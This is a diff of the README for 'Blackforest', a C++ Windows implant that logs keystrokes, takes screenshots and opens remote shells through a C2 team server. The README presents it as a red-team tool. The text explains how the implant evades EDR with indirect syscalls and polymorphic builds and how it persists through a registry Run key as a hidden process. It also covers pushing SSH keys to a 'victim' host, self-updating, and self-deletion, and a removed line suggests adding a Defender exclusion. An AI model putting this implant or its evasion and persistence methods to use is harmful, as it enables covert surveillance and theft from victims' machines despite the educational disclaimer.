@@ -1,41 +1,36 @@
-# 🌲 Blackforest: Advanced Red Team Implant
+# 🌲 Blackforest: Advanced C++ Red Team Implant
 
-> **⚠️ DISCLAIMER**: This software is for **Educational Use and Authorized Red Teaming ONLY**. Usage against systems without prior mutual consent is illegal. The author assumes no liability for misuse.
+> **⚠️ DISCLAIMER**: For Educational Use and Authorized Red Teaming ONLY. The author assumes no liability for misuse.
 
 ## 1. Project Overview
-**Blackforest** is a state-of-the-art C++ implant designed for covert operations, persistence, and specialized data exfiltration. It features a custom **Polymorphic Engine**, **Indirect Syscall execution**, and a robust **Multi-User Command & Control (C2) Team Server**.
+**Blackforest** is a professional-grade Windows implant designed for stealth, persistence, and automated long-term operation. It features a custom **Polymorphic Engine**, **Indirect Syscall execution**, and a unified **Team Server** for multi-user command & control.
 
-Unlike basic reverse shells, Blackforest is fully autonomous. It handles its own persistence, updates itself automatically via HTTP polling, and maintains a "Persistent Socket" connection for real-time, low-latency control.
+### Key Features
+*   **🕷️ Stealth**: Uses **Indirect Syscalls** (Assembly) to bypass user-mode EDR hooks (`jmp rax`).
+*   **🧬 Polymorphism**: Generates a unique stub and hash for every single build.
+*   **🔌 Persistent Networking**: Uses a single RAII-managed TCP socket with self-healing reconnection logic (No "noisy" connection spam).
+*   **♾️ Loop-Proof Auto-Update**: Polls for updates (Port 8000) and safely upgrades itself only when the binary changes.
+*   **🚀 Passwordless Deployment**: Automated SSH key injection for one-click updates.
 
 ---
 
-## 2. Architecture & Theory
-
-### System Design
-Blackforest is composed of three distinct layers:
+## 2. Architecture
 
 ```mermaid
 graph TD
-    User["👑 Prior (You)"] -->|Deploy| Dropper["� Dropper (SSH)"]
-    Dropper -->|Execute| Agent["🕷️ Agent (Detached)"]
+    User["👑 Operator"] -->|Term| C2["💻 Team Server (Python)"]
+    C2 --"Shell (4445)"--> Agent["🕷️ Blackforest Agent"]
+    C2 --"Data (4444)"--> Agent
+    Agent --"HTTP Poll (8000)"--> Update["📦 Update Server"]
     
-    subgraph "Agent Lifecycle"
-        Agent -->|1. Check| Mutex["🔒 Singleton Check"]
-        Mutex -->|2. Install| Registry["� Registry Run Key"]
-        Mutex -->|3. Evasion| Poly["🧬 Polymorphic Stub"]
-        
-        Poly -->|4. Loop| C2Loop{{"🌐 C2 Connection"}}
-        
-        C2Loop --"Connected"--> Work["⚡ Execute Tasks"]
-        Work -->|Keylogs/Screens| C2Loop
-        
-        C2Loop --"Disconnected"--> Sleep["� Sleep & Retry"]
-        Sleep --> C2Loop
+    subgraph Victim Machine
+        Agent -->|Hook| Keyboard["⌨️ Keylogs"]
+        Agent -->|API| Screen["🖥️ Screenshots"]
+        Agent -->|CMD| Shell["🐚 System Shell"]
     end
 ```
 
 ### Data Exfiltration Pipeline
-
 ```mermaid
 sequenceDiagram
     participant K as ⌨️ Keyboard
@@ -49,94 +44,62 @@ sequenceDiagram
     
     opt Buffer Full or Timeout
         B->>N: Flush Data
-        N->>N: � Encrypt Packet
+        N->>N: 🔒 Encrypt Packet
         N->>S: Send (Persistent Socket)
         S-->>N: ACK
     end
 ```
 
-### Core Technologies
-
-#### A. Persistent Networking (Keep-Alive)
-Standard implants open a new socket for every packet, creating "noise" in network logs.
-*   **Blackforest** uses a single **RAII-managed Persistent Socket**.
-*   It connects once and stays connected.
-*   **Self-Healing**: If the connection drops (Wi-Fi loss, sleep mode), the agent automatically enters a reconnection loop until the C2 is reachable again.
-
-#### B. Polymorphic Evasion
-To defeat signature-based antivirus:
-1.  **Syscall Spoofing**: The agent does not call Windows APIs (`WriteProcessMemory`) directly. It manually invokes syscalls using assembly, bypassing user-mode EDR hooks (`jmp rax`).
-2.  **String Encryption**: All sensitive strings are XOR-encrypted at compile time and decrypted only in memory when needed.
-3.  **Polymorphic Stub**: On every build, the `PolymorphicEngine` generates a unique "junk code" stub that alters the binary's hash signature.
-
-#### C. Loop-Proof Auto-Update
-The agent pulls its own updates without operator intervention:
-1.  Polls `http://C2:8000/update.txt` every 60 seconds.
-2.  Checks the logic: `RemoteHash == LocalHash`.
-3.  **Safety**: If the file size/hash is identical, it sleeps. It **only** updates when code actually changes, preventing infinite restart loops.
-
 ---
 
-## 3. Installation & Usage
+## 3. Installation & Deployment
 
 ### Step 1: Start the Team Server
-We have unified the Shell and Data listeners into a single dashboard.
+The Team Server unifies Shell and Data listeners into one dashboard.
 ```bash
 python3 c2/server.py
 ```
 *   **Port 4445**: Interactive Shells.
-*   **Port 4444**: Data Stream (Keylogs/Screenshots).
+*   **Port 4444**: Data Stream.
 *   **Port 8000**: Update Distribution.
 
-### Step 2: Compile & Deploy
-We use an **Automated CI/CD Pipeline**. You do not need to compile manually.
-
-**To Update/Deploy:**
+### Step 2: One-Time Setup (Passwordless SSH)
+To deploy without typing passwords every time, run this **ONCE**:
 ```bash
-scripts/build.sh   # Compiles new binary to bin/Blackforest.exe
-scripts/deploy.sh  # Uploads & Runs on Victim (Passwordless)
+scripts/setup_ssh.sh
 ```
-*(Run `scripts/setup_ssh.sh` once first if you haven't set up keys).*
+*   This generates an SSH key (if missing).
+*   Uploads it to the victim (`Avengers@192.168.0.6`).
+*   Configures `authorized_keys` on Windows.
 
-### Step 3: Operate
+### Step 3: CI/CD Deployment
+Once setup is done, you can build and deploy endlessly with **One Command**:
+```bash
+scripts/build.sh    # 1. Compiles new polymorphic binary
+scripts/deploy.sh   # 2. auto-uploads & executes (No Password!)
+```
+*   The agent will also auto-update itself via HTTP if already running.
+
+---
+
+## 4. Operation Guide
+
 Inside the `c2/server.py` dashboard:
-*   `list`: View active victims.
-*   `interact <ID>`: Enter a victim's shell.
-*   **Keylogs**: Appear automatically in the terminal logging file (clean output).
+*   `list`: Show active shell sessions.
+*   `interact <ID>`: Enter a remote shell.
+*   **Keylogs**: Appear automatically in your terminal log file.
+
+### Operational Security (OPSEC)
+1.  **Identity Isolation**: You typically cannot keylog `Admin` if you are running as `User`. Always check `whoami`.
+2.  **Persistence**: The agent survives reboots via `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+3.  **Process Hiding**: Runs as `DETACHED_PROCESS` (No Window). Closing your SSH terminal does **NOT** kill the agent.
 
 ---
 
-## 4. Operational Security (OPSEC)
-
-### Persistence
-The agent installs itself to multiple locations to ensure survival:
-1.  **Registry**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` -> `BlackforestUpdater`.
-2.  **File System**: `%APPDATA%\Blackforest\Blackforest.exe`.
-3.  **Process State**: Runs as a **Detached Process** (`CREATE_NO_WINDOW`). Closing the parent console (SSH) does **not** kill the agent.
-
-### Identity Isolation
-*   **Constraint**: Keyloggers can only capture keys from the **current user context**.
-*   **Fix**: If you deploy as user `Avengers` via SSH, but the target user is actively typing as `Admin`, you will not see keys. You must execute the agent **as the target user**.
-
----
-
-## 5. Troubleshooting
-
-| Issue | Cause | Fix |
-| :--- | :--- | :--- |
-| **"Access Denied"** | Defender blocked the file. | `Add-MpPreference -ExclusionPath ...` |
-| **No Keylogs** | Wrong User Context. | Ensure `whoami` matches the physical user. |
-| **Log Spam** | Old Listener. | Restart `c2/server.py`. |
-| **SSH Closes Agent** | Old Binary. | Run `./build.sh` (Fixes Detachment). |
-
----
-
-*🌲 SpyWare 🌲*
-
-### 5. Emergency: Remote Kill Switch
+## 5. Emergency: Remote Kill Switch
 To immediately self-destruct all active agents:
 1.  **Stop C2 Server**.
-2.  Edit `update.txt` in your web root (or served by C2).
+2.  Edit `update.txt` in your web root.
 3.  Replace content with the **Kill Key**:
     ```text
     09827a801ea931cdacf6ee8828b3283add9e694764a8c0aea06f73b9eed66d22
@@ -144,8 +107,9 @@ To immediately self-destruct all active agents:
 4.  **Wait 60 seconds**.
 5.  All agents will:
     *   Detect the Kill Key.
-    *   Remove Registry Persistence (`HKCU...Run`).
-    *   Delete their own executable (`Melting`).
-    *   Terminate immediately.
+    *   **Melt**: Delete their own executable and Registry keys.
+    *   Terminate.
 
 ---
+
+*🌲 Navigate the forest. Remain unseen. 🌲*
